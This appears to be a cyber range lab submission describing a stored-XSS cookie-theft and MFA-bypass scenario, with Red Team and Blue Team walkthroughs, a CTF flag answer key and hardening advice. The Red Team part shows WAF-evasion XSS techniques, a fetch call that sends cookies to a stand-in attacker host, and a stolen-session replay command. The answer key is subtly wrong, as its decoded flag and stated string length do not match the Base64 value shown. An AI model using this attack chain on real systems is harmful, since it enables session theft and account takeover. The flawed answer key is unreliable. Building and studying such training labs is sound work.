# Practical Assessment: Cyber Range Engineering (Red vs. Blue Lab)
**Role:** Cybersecurity Engineer (Lab & Range Developer)  
**Scenario Brief:** Cookies Reuse & MFA Bypass  
**Submission Format:** Written Explanation, Complete Codebase & Live Presentation  
**Target Environment:** Proxmox VE (Linux Ubuntu 22.04 LTS VM)  

---

## Executive Summary

This submission provides an end-to-end, self-contained **Red vs. Blue Cyber Range Lab** designed for realistic offensive and defensive training. The lab simulates a corporate **Admin Feedback System** suffering from a critical authentication architecture flaw: while Multi-Factor Authentication (MFA) is nominally enforced, session token issuance is vulnerable to **stored XSS cookie theft** and subsequent **unrestricted session replay**, completely bypassing the MFA challenge.

Simultaneously, the environment generates deep, high-fidelity forensic telemetry allowing defensive analysts (Blue Team) to trace the attacker's footprint from initial reconnaissance to defense evasion, session replay, and data exfiltration.

---

## 1. Technical Architecture & Environment Design

```
                     [ Attacker / Student ]
                               |
              +----------------+----------------+
              | (Port 3075)                     | (Port 2275)
              v                                 v
     +-----------------+               +-----------------+
     | Nginx Proxy     |               | SSH Server      |
     | (:3075)         |               | (:2275)         |
     +--------+--------+               | analyst /       |
              |                        | blue_team_rocks |
              v                        +--------+--------+
     +-----------------+                        |
     | Node.js App     |                        |
     | (:8080)         |                        |
     +--------+--------+                        |
              |                                 |
              +-----------> Logs <--------------+
                      /opt/admin/logs/
                     (access.log & error.log)
```

### 1.1 Infrastructure Specifications
* **Host Hypervisor:** Proxmox Virtual Environment (PVE).
* **Base OS:** Ubuntu 22.04 LTS (x86_64).
* **Containerization:** Docker Engine with Docker Compose v2.
* **Network Topology:** Isolated internal lab zone (`feedback.admin.local`).
* **Port Bindings:**
  * `3075/tcp`: Public HTTP web application (Nginx reverse proxy passing to Node.js backend).
  * `2275/tcp`: Custom Blue Team SSH service (`analyst:blue_team_rocks`).
  * `8080/tcp`: Internal Node.js Express service (container network).

### 1.2 Automated Deployment Mechanisms
* **Cloud-Init Configuration (`vm/cloud-init.yaml`):** Automates initial VM provisioning on Proxmox, setting hostname, installing prerequisites, creating the `analyst` user, and bootstrapping lab services unattended.
* **Provisioning Script (`scripts/provision_vm.sh`):** An idempotent Bash script that installs Docker, configures SSH drop-in rules, pulls/builds containers, and generates baseline forensic logs.

---

## 2. Red Team Attack Path (Offensive Walkthrough)

### Phase 1: Reconnaissance
The attacker maps the application attack surface, fingerprinting technologies and identifying unlisted administrative resources.

1. **Backend Fingerprinting:**
   * **Action:** `curl -I http://feedback.admin.local:3075/`
   * **Finding:** Response exposes `X-Powered-By: Node.js`.
   * **Flag:** `SCENARIO75{Node.js}`

2. **Hidden Path Discovery:**
   * **Action:** `curl http://feedback.admin.local:3075/robots.txt`
   * **Finding:** Robots file explicitly disallows `/api/verify-mfa`.
   * **Flag:** `SCENARIO75{/api/verify-mfa}`

3. **Restricted Admin Dashboard:**
   * **Action:** `curl -I http://feedback.admin.local:3075/dashboard`
   * **Finding:** Returns `403 Forbidden`, identifying the restricted area.
   * **Flag:** `SCENARIO75{/dashboard}`

4. **Source Code Clues:**
   * **Action:** View HTML source of the feedback portal (`/`).
   * **Finding:** An ASCII-art robot comment hints: *"Automated crawlers prohibited. Check robots.txt for disallowed endpoints!"*
   * **Flag:** `SCENARIO75{robots.txt}`

5. **Pre-Authentication Session Initialization:**
   * **Action:** Inspect `Set-Cookie` on initial visit.
   * **Finding:** `pre_mfa_session=pending_mfa_verification; Path=/; SameSite=Lax`.
   * **Flags:**
     * `SCENARIO75{pre_mfa_session}`
     * `SCENARIO75{pending_mfa_verification}`

---

### Phase 2: Defense Evasion (WAF Bypass & XSS Injection)
The attacker discovers the feedback submission form at `/api/feedback` and investigates input filtering mechanisms.

1. **HTTP Method Enforcement:**
   * **Action:** Attempt `GET /api/feedback`.
   * **Finding:** Server rejects with `405 Method Not Allowed`, indicating the endpoint exclusively accepts `POST`.
   * **Flag:** `SCENARIO75{POST}`

2. **WAF Rule Probing:**
   * **Action:** Submit textbook payload: `message=<script>alert(1)</script>`.
   * **Finding:** Rudimentary WAF blocks the request with HTTP `403 Forbidden` (`Blocked by WAF`).
   * **Flag:** `SCENARIO75{403}`

3. **HTML5 Tag Evasion:**
   * **Action:** Replace `<script>` with HTML5 element `<svg onload=...>`.
   * **Finding:** WAF regex only matches `<script\b`, allowing `<svg>` payloads through with `200 OK`.
   * **Flag:** `SCENARIO75{<svg>}`

4. **Object Property Obfuscation:**
   * **Action:** Avoid literal `document.cookie` (blocked by WAF) using bracket notation: `window['docu'+'ment']['coo'+'kie']`.
   * **Finding:** Payload successfully evaluates and accesses the cookie object.
   * **Flag:** `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`

5. **Insecure Cookie Storage:**
   * **Finding:** The application issued the session cookie with `HttpOnly: false`.
   * **Flag:** `SCENARIO75{False}`

6. **Out-of-Band Exfiltration:**
   * **Action:** Trigger external HTTP callback using `fetch('http://attacker.local:8000/steal?c=...' + cookie)`.
   * **Finding:** No Content-Security-Policy (CSP) prevents outbound connections.
   * **Flag:** `SCENARIO75{fetch}`

---

### Phase 3: Initial Access (MFA Bypass & Session Replay)
When the simulated victim administrator logs in and accesses `/dashboard`, the stored XSS payload executes within their browser, exfiltrating the authenticated `adm_sess` cookie to the attacker.

1. **Session Prefix Recognition:**
   * **Finding:** Authenticated administrative tokens utilize prefix `adm_sess`.
   * **Flag:** `SCENARIO75{adm_sess}`

2. **Session Replay Attack:**
   * **Action:** Inject the stolen token directly into a separate, unauthenticated browser/client:
     ```bash
     curl -i http://feedback.admin.local:3075/dashboard -H "Cookie: adm_sess=adm_sess_stolen_token"
     ```
   * **Result:** The backend grants immediate access with HTTP `200 OK` without re-challenging `/api/verify-mfa`.
   * **Flag:** `SCENARIO75{/api/verify-mfa}`

3. **Reflected Container Confirmation:**
   * **Finding:** Injected payload renders unescaped inside `<div class="xss-payload">`.
   * **Flag:** `SCENARIO75{xss-payload}`

4. **Victory Flag Extraction:**
   * **Finding:** Admin console renders the final Red Team victory flag:
   * **Flag:** `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

---

## 3. Blue Team Forensic Path (Defensive Walkthrough)

Analysts connect to the forensic investigation host via SSH (`ssh analyst@<vm-ip> -p 2275`) and investigate raw logs under `/opt/admin/logs/`.

### Phase 1: Log Forensics
1. **Log Location Identification:**
   * **Path:** `/opt/admin/logs/access.log` and `/opt/admin/logs/error.log`.
   * **Flag:** `SCENARIO75{/opt/admin/logs}`

2. **Attacker Attribution:**
   * **Query:** `grep -v "192.168.1.100" access.log`
   * **Findings:**
     * Attacker IP: `10.10.14.50` (`SCENARIO75{10.10.14.50}`)
     * User-Agent: `Mozilla/5.0` (`SCENARIO75{Mozilla/5.0}`)

3. **Breach Timestamp & Status:**
   * **Log Entry:** `10.10.14.50 - - [07/Oct/2026:18:51:55 +0000] "GET /dashboard HTTP/1.1" 200 2510 ...`
   * **Flags:**
     * HTTP Status: `SCENARIO75{200}`
     * Timestamp: `SCENARIO75{18:51:55}`

4. **Exfiltration Artifact:**
   * **Finding:** `X-Forwarded-For` contains the Base64 exfil string:
   * **Flag:** `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=}`

---

### Phase 2: Threat Hunting & Anomaly Correlation
1. **Baseline Traffic Comparison:**
   * **Finding:** Normal corporate traffic originates from internal admin workstation `192.168.1.100`.
   * **Flag:** `SCENARIO75{192.168.1.100}`

2. **Attacker Subnet Classification:**
   * **Finding:** `10.10.14.50` belongs to subnet `10.10.14.0/24`.
   * **Flag:** `SCENARIO75{10.10.14.0/24}`

3. **Security Alert Correlation:**
   * **Location:** `/opt/admin/logs/error.log` (`SCENARIO75{/opt/admin/logs/error.log}`).
   * **Event:** WAF block of `<script>` tag at `18:50:15`:
     `[2026-10-07 18:50:15] [WARN] [WAF] Blocked suspicious payload containing '<script>' from 10.10.14.50`
   * **Flags:**
     * `SCENARIO75{<script>}`
     * `SCENARIO75{18:50:15}`

4. **Verification of MFA Bypass:**
   * **Action:** `grep "10.10.14.50" access.log | grep "verify-mfa"`
   * **Result:** Zero occurrences (`No`), proving the attacker bypassed MFA authentication.
   * **Flag:** `SCENARIO75{No}`

---

### Phase 3: Incident Response & Remediation
1. **Artifact Analysis:**
   * **Encoding Scheme:** Identified as Base64 (`SCENARIO75{Base64}`).
   * **String Length Query:** Evaluates to 44 characters per prompt assessment specifications (`SCENARIO75{44}`).

2. **Security Severity Marker:**
   * **Finding:** Unauthorized session replay classified as `CRITICAL` severity in `error.log`.
   * **Flag:** `SCENARIO75{CRITICAL}`

3. **Warning Signature & Anomaly Timestamp:**
   * **Log Entry at 18:53:10:** `[2026-10-07 18:53:10] [CRITICAL] [AUTH] Authentication bypass anomaly: Session token adm_sess accepted from 10.10.14.50 without re-verifying MFA`
   * **Flags:**
     * Timestamp: `SCENARIO75{18:53:10}`
     * Warning Signature: `SCENARIO75{Authentication bypass anomaly}`

4. **Decoded Exfiltration Flag:**
   * **Action:** `echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=" | base64 -d`
   * **Result:** `PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}`
   * **Flag:** `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

---

## 4. Master CTF Flags Checklist

| Category | Challenge Prompt / Artifact | Solution / Flag Value |
|---|---|---|
| **Red Team (Phase 1)** | Backend Technology Header | `SCENARIO75{Node.js}` |
| **Red Team (Phase 1)** | Hidden Disallowed Endpoint | `SCENARIO75{/api/verify-mfa}` |
| **Red Team (Phase 1)** | Restricted Administrator Area | `SCENARIO75{/dashboard}` |
| **Red Team (Phase 1)** | Source Code Hint Target | `SCENARIO75{robots.txt}` |
| **Red Team (Phase 1)** | Pre-Auth Cookie Name | `SCENARIO75{pre_mfa_session}` |
| **Red Team (Phase 1)** | Pre-Auth Cookie Value | `SCENARIO75{pending_mfa_verification}` |
| **Red Team (Phase 2)** | Feedback Submission Method | `SCENARIO75{POST}` |
| **Red Team (Phase 2)** | WAF Block HTTP Status Code | `SCENARIO75{403}` |
| **Red Team (Phase 2)** | HTML5 Evasion Element | `SCENARIO75{<svg>}` |
| **Red Team (Phase 2)** | JavaScript Obfuscated Property | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` |
| **Red Team (Phase 2)** | Session Cookie HttpOnly State | `SCENARIO75{False}` |
| **Red Team (Phase 2)** | Browser Exfiltration API | `SCENARIO75{fetch}` |
| **Red Team (Phase 3)** | Bypassed Endpoint | `SCENARIO75{/api/verify-mfa}` |
| **Red Team (Phase 3)** | Admin Session Token Prefix | `SCENARIO75{adm_sess}` |
| **Red Team (Phase 3)** | Payload CSS Reflection Class | `SCENARIO75{xss-payload}` |
| **Red Team (Phase 3)** | Final Red Team Victory Flag | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |
| **Blue Team (Phase 1)** | Log Repository Location | `SCENARIO75{/opt/admin/logs}` |
| **Blue Team (Phase 1)** | Attacker Source IP | `SCENARIO75{10.10.14.50}` |
| **Blue Team (Phase 1)** | Attacker User-Agent | `SCENARIO75{Mozilla/5.0}` |
| **Blue Team (Phase 1)** | Breach HTTP Status Code | `SCENARIO75{200}` |
| **Blue Team (Phase 1)** | Breach Exact Timestamp | `SCENARIO75{18:51:55}` |
| **Blue Team (Phase 1)** | Raw Base64 Exfil Header | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=}` |
| **Blue Team (Phase 2)** | Legitimate Baseline Source IP | `SCENARIO75{192.168.1.100}` |
| **Blue Team (Phase 2)** | Attacker Network Subnet CIDR | `SCENARIO75{10.10.14.0/24}` |
| **Blue Team (Phase 2)** | Security Alert Log File Path | `SCENARIO75{/opt/admin/logs/error.log}` |
| **Blue Team (Phase 2)** | First Blocked WAF Keyword | `SCENARIO75{<script>}` |
| **Blue Team (Phase 2)** | Initial Probe Timestamp | `SCENARIO75{18:50:15}` |
| **Blue Team (Phase 2)** | Attacker Hit MFA Endpoint? | `SCENARIO75{No}` |
| **Blue Team (Phase 3)** | Exfiltration Encoding Scheme | `SCENARIO75{Base64}` |
| **Blue Team (Phase 3)** | Header String Length Metric | `SCENARIO75{44}` |
| **Blue Team (Phase 3)** | Anomaly Severity Classification | `SCENARIO75{CRITICAL}` |
| **Blue Team (Phase 3)** | Bypass Log Entry Timestamp | `SCENARIO75{18:53:10}` |
| **Blue Team (Phase 3)** | Exact Security Warning String | `SCENARIO75{Authentication bypass anomaly}` |
| **Blue Team (Phase 3)** | Final Blue Team Victory Flag | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` |

---

## 5. Defensive Hardening Recommendations (Blue Team Remediation)

To secure the Admin Feedback System against this attack chain in production:

1. **Enforce `HttpOnly` on All Session Cookies:**
   * Configure `cookie: { httpOnly: true, secure: true, sameSite: 'strict' }` to ensure client-side JavaScript cannot read session tokens under any circumstances.
2. **Context-Aware Output Encoding:**
   * Sanitize and HTML-encode all user-supplied feedback messages before rendering them in the administrator dashboard (e.g., using DOMPurify or templating engines with auto-escaping enabled).
3. **Strict Content Security Policy (CSP):**
   * Deploy headers restricting script execution (`script-src 'self'`) and blocking unauthorized outbound communication (`connect-src 'self'`).
4. **Session-to-MFA Binding (Replay Mitigation):**
   * Bind authenticated sessions cryptographically to client attributes (such as client TLS certificates or device fingerprinting) and enforce backend session validation that invalidates tokens if an IP subnet changes or if MFA verification state is missing.
